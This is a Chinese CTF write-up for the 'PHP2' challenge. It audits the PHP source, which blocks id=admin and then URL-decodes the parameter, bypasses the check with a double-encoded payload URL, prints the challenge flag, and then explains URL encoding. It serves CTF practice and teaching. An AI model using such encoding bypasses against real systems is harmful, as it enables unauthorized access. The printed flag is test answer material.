## PHP2

---

根据题目 php 访问


http://61.147.171.105:59446/index.php

可以访问 查看源码 php文件源代码通常在phps文件

---


http://61.147.171.105:59446/index.phps

源码如下

```php
<?php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>
```
---
### 源码审计

* 第一个 if， 如果get请求的参数id=admin，则会出现not allowed！

* 对 id 进行 urldecode()

* 第二个 if，判断解码后的id 是否为 admin。

* 浏览器会对url 进行一次解码。

---

### 综上 需要给id传入 两次（对应题目PHP2）编码后的 admin即可

---

admin
* 对a编码 得到 %61dmin
* 对%编码 得到 %2561dmin

payload:

http://61.147.171.105:59446/?id=%2561dmin

### flag

Key: cyberpeace{2f15b0e8f21968bd215c9675c8418fff}

---

---

#### url编码原理
urldecode() 是PHP函数，解码经过URL编码的字符串，解码回原始的形式；

URL 编码（也称为百分号编码或URL转义）是一种用于在URL中表示特殊字符和非ASCII字符的技术。它的原理是将不安全或非标准字符转换成特殊的编码形式，以确保它们能够被安全地传输和解释，同时保留URL的有效性。URL 编码基于以下原则：

* 特殊字符转义：URL 编码将特殊字符，如空格、问号、和符号等，转换成以百分号 "%" 开头的两位十六进制数。例如，空格会被编码为"%20"，问号为"%3F"。

* 非ASCII字符编码：非ASCII字符，例如汉字、俄文、希腊字母等，通常不是URL允许的字符，因此需要进行编码以在URL中使用。这些字符被编码为一系列百分号编码的字符，以表示其Unicode代码点。例如，字母 "é" 可以被编码为"%C3%A9"。

* 保留字符不编码：URL 编码允许一些字符在URL中保持原样，不进行编码。这些字符包括字母、数字、连字符、下划线等。这些字符在URL中是安全的，因此不需要编码。

* 百分号 "%" 编码：因为百分号 "%" 本身在URL中有特殊意义，所以如果要在URL中表示 "%" 字符本身，它也需要进行编码，变成"%25"。






